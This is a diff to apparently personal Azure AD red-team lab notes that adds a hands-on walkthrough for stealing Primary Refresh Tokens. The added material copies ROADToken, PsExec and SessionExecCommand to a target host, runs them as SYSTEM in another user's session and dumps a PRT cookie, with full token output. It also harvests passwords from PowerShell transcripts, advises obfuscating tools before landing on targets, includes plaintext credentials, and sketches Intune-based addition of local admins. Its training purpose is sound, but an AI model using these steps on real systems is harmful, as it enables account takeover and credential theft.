@@ -24,7 +24,7 @@
 dsregcmd /status
 ```
 
-#### Extract PRT, Session key (keyvalue) and Tenant ID
+#### Extract PRT, Session key (keyvalue) and Tenant ID  -- after Aug 2021, Mimiikatz is no longer working 
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 ```
@@ -34,7 +34,163 @@ Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
 ```
 
-#### Request a certificate from PRT
+
+### Now use below tool to extract PRT in the session of target AAD user 
+```
+ROADToken.exe 
+SessionExecCommand  (need to be done in SYS privilege)
+
+
+PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path .\ROADToken.exe -Destination C:\Users\student199\Documents -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\AzAD\Tools\ROADToken.exe Destination: C:\Users\student199\Documents".
+PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path .\PsExec64.exe -Destination C:\Users\student199\Documents -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\AzAD\Tools\PsExec64.exe Destination: C:\Users\student199\Documents".
+PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path .\SessionExecCommand.exe -Destination C:\Users\student199\Documents -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\AzAD\Tools\SessionExecCommand.exe Destination: C:\Users\student199\Documents".
+PS C:\AzAD\Tools> Enter-PSSession -Session $jumpvm
+[51.116.180.87]: PS C:\Users\student199\Documents> $infadminsrv
+[51.116.180.87]: PS C:\Users\student199\Documents>
+[51.116.180.87]: PS C:\Users\student199\Documents> $password=ConvertTo-SecureString 'Stud199Password@123' -AsPlainText -Force
+[51.116.180.87]: PS C:\Users\student199\Documents> $cred = New-Object System.Management.Automation.PSCredential('.\student199',$password)
+[51.116.180.87]: PS C:\Users\student199\Documents> $infradminsrv=New-PSSession -ComputerName 10.0.1.5 -Credential $cred
+
+
+
+Copy file to infradminsrv
+
+[51.116.180.87]: PS C:\Users\student199\Documents>
+[51.116.180.87]: PS C:\Users\student199\Documents> Copy-Item -ToSession $infradminsrv -Path .\ROADToken.exe -Destination C:\Users\Public\student199 -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\student199\Documents\ROADToken.exe Destination: C:\Users\Public\student199".
+[51.116.180.87]: PS C:\Users\student199\Documents> Copy-Item -ToSession $infradminsrv -Path .\PsExec64.exe -Destination C:\Users\Public\student199 -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\student199\Documents\PsExec64.exe Destination: C:\Users\Public\student199".
+[51.116.180.87]: PS C:\Users\student199\Documents> Copy-Item -ToSession $infradminsrv -Path .\SessionExecCommand.exe -Destination C:\Users\Public\student199 -Verbose
+VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\student199\Documents\SessionExecCommand.exe Destination: C:\Users\Public\student199".
+[51.116.180.87]: PS C:\Users\student199\Documents>
+//for real assessment, obfusficate the above tool first before landing to the target
+
+
+
+Get challenge outside JUMPVM
+
+//Generate the noun against OAUTH2/token endpoint
+
+$Tennant="2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
+
+PS C:\AzAD\Tools> $URL="https://login.microsoftonline.com/$Tennant/oauth2/token"
+PS C:\AzAD\Tools> $Params = @{
+>>     "URI" = $URL
+>>     "Method" = "POST"
+>> }
+PS C:\AzAD\Tools> Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+
+Nonce
+-----
+AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA
+
+
+
+
+
+How do we know MARK should be used to extract PRT ? 
+
+Invoke-Command -Session $infradminsrc -ScriptBlock{GetProcess -IncludeUsername} 
+
+	
+
+
+It is also required to SYSTEM user to execute SessionExecComand  to get PRT
+
+On the jumpvm
+[51.116.180.87]: PS C:\Users\student199\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student199\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student199\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student199\ROADToken.exe AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA > C:\Users\Public\student199\PRT.txt"}
+
+
+
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Connecting to local system...
+    + CategoryInfo          : NotSpecified: (Connecting to local system...:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+    + PSComputerName        : 10.0.1.5
+
+NotSpecified: (:String) [], RemoteException
+NotSpecified: (:String) [], RemoteException
+Starting PSEXESVC service on local system...
+NotSpecified: (:String) [], RemoteException
+NotSpecified: (:String) [], RemoteException
+Connecting with PsExec service on infradminsrv...
+NotSpecified: (:String) [], RemoteException
+NotSpecified: (:String) [], RemoteException
+Starting cmd.exe on infradminsrv...
+NotSpecified: (:String) [], RemoteException
+NotSpecified: (:String) [], RemoteException
+NotSpecified: (:String) [], RemoteException
+cmd.exe exited on infradminsrv with error code 0.
+
+
+[51.116.180.87]: PS C:\Users\student199\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{Get-Content -Path C:\Users\Public\student199\PRT.txt}
+Exec'd command C:\Users\Public\student199\ROADToken.exe as user MichaelMBarron
+stdOutput: Using nonce AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA supplied on command line
+stdOutput: L  { "response": [{ "name": "x-ms-RefreshTokenCredential", "data": "eyJhbGciOiJIUzI1NiIsICJrZGZfdmVyIjoyLCAiY3R4Ijoia3QzYVg1dzE3dE1UV28weVNnYjJINUV0Tm1HbXA3azMifQ.eyJyZWZyZXNoX3Rva2VuIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBQ2suQWdBQkFBRUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQLWxFQ1hvWGo2R0tBdDQtN2RhdE16WHoxMkg2clJFNXVGai1RcGhsaDU3eEdrREJOLU9LeU1LMlBIMXM4eWM1X21Ic0xZNDFtbzU5a1pjUUpMbjVUbWJma3JIR2Z1ZUtZcDhfQW4zeGlocFBLUVRsWDAwVlhpZUVBdlMzOXAwc1hPN1lBRVk5UDFzVTd1eVRFU05nTUNSMlloRjlFbGZPT3U1eHM2QVpZR293M3diSTFUMnlYMHY1VS1yOTV5QzYzR2FwdUtmdmtLcmpGMHZMNmkyUFZsZ2Fhdi1iQzlwV3hGdS1ncVZabkRQbFVSUHA2WVRnN3pFUEs4VlVDQ05UYnVHSGlmY0VzdkpTZUdxYUthSjF6b0VzYkhVUmg3a2pWTFhHYUNzRHJDWVE2alprdW5RSUNBN1J5OWFaNzhfdnpRWmYxRFptU3JpUkY4MWJNVFJFZXpRR2FNOG1oMXZTTDhNTG5sWGNWLUc0QUVXaGV1N1hGbzJIZkh5UlEzZzlqeDFZQ3NMdGNEQnlscmNMR2ctelA5ZGlGNmxsVC00dUNqZW1BVW5SRFVQd1p1R0FMUWozaFVSVHlVV3JDUVE5Y3U5UEd4REx0bVJhcVN1Z2ZpTjBoNXhCVV9vZzcwWjFDdFExTS14VzM3SVVZTmdYUko0VWplRU8za09oeXRwMUhJMmNyeGFQaS1xS1hUdVlZa3paSlBKLWttTksxU1loR0ltSDk4OVJoSlU2UlFkeVFqN0RDb3hKRllHYWo3SnFVbnVJbFJ3TVVPa0paQ0dKU0JUbHlUMGhpWEVUWUpBc3BHNkdIUUJQeW81YkwzeWlCNUhDUUhLeVZfT08zNTBBdnYweVEzRUl5b0pCOUlHMzhvR2FfYlZHTzg3bERNM0lsYWNlVkxDZ2NteXNHU1V5VE1hV0hOZ29ybHRsUDFBa0g1b0h4Yl9FcnM1ZjkyNUdkSUpxRVVhc0I4anZKU29OazJFb3NrUmF3T1FOUkQwVUstRVJyQ2lpVE5rUUZBcUlkR01OYXk1YUJldnA2Y29XejFtbjdkZnlGRDBtNzM0ZTV2emtCb2pFb0tNbmlVLVpnbHloWUZpVkJNR0ZNNWpqdXZVNmh6WjZFbTYzbjVYdjhWODJpMFRLX1l0bi1PQiIsICJpc19wcmltYXJ5IjoidHJ1ZSIsICJyZXF1ZXN0X25vbmNlIjoiQXdBQkFBRUFBQUFDQU96X0JBRDBfeFgzczJhUVRpN2E5QU1Ka1kwTm1NRS1lQnNPTHYtc0VwUFRSTkY3cHFSMW43WkdKcV9LemI4Y2R1c0NYaE9wQWh6OUtncF83bmtHaUxfWkxnSnJXVlFnQUEifQ.cVlXlSkiGLRFnKXhlhc-G4Pvw_hZkfrpTdVKbsqy-ec", "p3pHeader": "CP=\"CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT\"", "flags": 8256 }] }
+stdOutput: 0
+
+
+You might need to repeat to get the challenge and get PRT.  
+
+
+
+JWT decode
+
+{
+    "refresh_token": "0.AXAAKctQLXtfpEiHzv51qUGttoc7qjhtoBdIsnV6MWmI2TtwACk.AgABAAEAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P-lECXoXj6GKAt4-7datMzXz12H6rRE5uFj-Qphlh57xGkDBN-OKyMK2PH1s8yc5_mHsLY41mo59kZcQJLn5TmbfkrHGfueKYp8_An3xihpPKQTlX00VXieEAvS39p0sXO7YAEY9P1sU7uyTESNgMCR2YhF9ElfOOu5xs6AZYGow3wbI1T2yX0v5U-r95yC63GapuKfvkKrjF0vL6i2PVlgaav-bC9pWxFu-gqVZnDPlURPp6YTg7zEPK8VUCCNTbuGHifcEsvJSeGqaKaJ1zoEsbHURh7kjVLXGaCsDrCYQ6jZkunQICA7Ry9aZ78_vzQZf1DZmSriRF81bMTREezQGaM8mh1vSL8MLnlXcV-G4AEWheu7XFo2HfHyRQ3g9jx1YCsLtcDBylrcLGg-zP9diF6llT-4uCjemAUnRDUPwZuGALQj3hURTyUWrCQQ9cu9PGxDLtmRaqSugfiN0h5xBU_og70Z1CtQ1M-xW37IUYNgXRJ4UjeEO3kOhytp1HI2crxaPi-qKXTuYYkzZJPJ-kmNK1SYhGImH989RhJU6RQdyQj7DCoxJFYGaj7JqUnuIlRwMUOkJZCGJSBTlyT0hiXETYJAspG6GHQBPyo5bL3yiB5HCQHKyV_OO350Avv0yQ3EIyoJB9IG38oGa_bVGO87lDM3IlaceVLCgcmysGSUyTMaWHNgorltlP1AkH5oHxb_Ers5f925GdIJqEUasB8jvJSoNk2EoskRawOQNRD0UK-ERrCiiTNkQFAqIdGMNay5aBevp6coWz1mn7dfyFD0m734e5vzkBojEoKMniU-ZglyhYFiVBMGFM5jjuvU6hzZ6Em63n5Xv8V82i0TK_Ytn-OB",
+    "is_primary": "true",
+    "request_nonce": "AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA"
+}
+
+
+
+
+
+PS C:\AzAD\Tools> $password = ConvertTo-SecureString 'StudUserPassword@123' -AsPlainText -Force
+>>
+PS C:\AzAD\Tools> $creds = New-Object System.Management.Automation.PSCredential('studentUser', $password)
+PS C:\AzAD\Tools> Enter-PSSession -ComputerName 172.16.2.24 -Credential $creds
+[172.16.2.24]: PS C:\Users\studentUser\Documents> cat C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
+$Password = ConvertTo-SecureString 'UserIntendedToManageSyncWithCl0ud!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('adconnectadmin', $Password)
+Enter-PSSession -ComputerName defres-adcnct -Credential $cred
+
+//Microsoft Powershell system-wide transcript -> regardless of system management dll, the command and output into the transscript would capture the output and comand 
+
+No need to get the IP address of the target machine here
+
+[172.16.2.24]: PS C:\Users\studentUser\Documents> ping defres-adcnct
+
+Pinging defres-adcnct [fe80::b9c7:7721:d798:c91d%14] with 32 bytes of data:
+Reply from fe80::b9c7:7721:d798:c91d%14: time=4ms
+Reply from fe80::b9c7:7721:d798:c91d%14: time<1ms
+Reply from fe80::b9c7:7721:d798:c91d%14: time=1ms
+Reply from fe80::b9c7:7721:d798:c91d%14: time=1ms
+
+Ping statistics for fe80::b9c7:7721:d798:c91d%14:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 4ms, Average = 1ms
+
+
+
+Lateral Movement - Intune - Cloud to On-Prem ( Micheal is INTUNE Administrator)   
+
+Execute the script to add user to the local user and add it to the local admin group  against the registered device  (device is compliant from Azure Portal - conditional access policies)   via endpoint.microsoft.com UI levaraging on PRT cookie  -ms-xs-refreshTokenCredential 
+
+PS C:\Windows\system32> hostname
+DESKTOP-M7C1AFM
+
+```
+
+#### Request a certificate from PRT  - No longer working but BlackBlack US 2022 -MorRubin release a new technique
 - https://github.com/morRubin/PrtToCert
 - Code is modified in the lab
 ```
